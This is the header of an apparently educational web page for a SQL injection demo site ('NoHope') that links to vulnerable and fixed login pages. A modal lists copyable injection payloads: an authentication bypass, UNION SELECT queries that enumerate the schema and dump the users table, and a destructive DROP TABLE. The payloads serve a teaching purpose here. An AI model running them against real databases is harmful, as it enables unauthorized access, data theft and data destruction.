<!doctype html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">

  <link rel="stylesheet" href="assets/fonts/icomoon/style.css">

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="assets/css/bootstrap.min.css">

  <!-- Style -->
  <link rel="stylesheet" href="assets/css/style.css?v=<?php echo time(); ?>">

  <title>SQL Injection</title>
</head>

<body>


  <div class="site-mobile-menu site-navbar-target">
    <div class="site-mobile-menu-header">
      <div class="site-mobile-menu-close mt-3">
        <span class="icon-close2 js-menu-toggle"></span>
      </div>
    </div>
    <div class="site-mobile-menu-body"></div>
  </div>
  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Code SQL Injection</h5>
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <div class="text-code alert alert-success">
            <div class="text">' or 1 = 1 #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION SELECT 1, version() #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION SELECT 1, user() #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION SELECT 1, database() #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION SELECT 1, @@port #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION select table_schema,null from
              information_schema.tables ##</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION select table_name,null from
              information_schema.tables where table_schema='nohope' #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION select table_name,column_name from
              information_schema.columns where table_name='users' #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION select name, description from users #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' UNION SELECT * FROM users #</div>
            <div class="copy">Copy</div>
          </div>
          <div class="text-code alert alert-success">
            <div class="text">' ; DROP TABLE users #</div>
            <div class="copy">Copy</div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <header class="site-navbar js-sticky-header site-navbar-target" role="banner">

    <div class="container">
      <div class="row align-items-center position-relative">


        <div class="site-logo">
          <a href="index.php" class="text-black"><span class="text-primary">NoHope</a>
        </div>

        <div class="col-12">
          <nav class="site-navigation text-right ml-auto " role="navigation">

            <ul class="site-menu main-menu js-clone-nav ml-auto d-none d-lg-block">
              <li><a href="index.php" class="nav-link">Home</a></li>
              <li><a href="login.php" class="nav-link">Login</a></li>
              <li><a href="login-fix.php" class="nav-link">Login Fix</a></li>
              <li><a href="" class="nav-link" data-toggle="modal" data-target="#exampleModal">Code Injection</a></li>
              <li><a href="team.php" class="nav-link">Team</a></li>
            </ul>
          </nav>

        </div>

        <div class="toggle-button d-inline-block d-lg-none"><a href="#" class="site-menu-toggle py-5 js-menu-toggle text-black"><span class="icon-menu h3"></span></a></div>

      </div>
    </div>

  </header>

  <div class="container">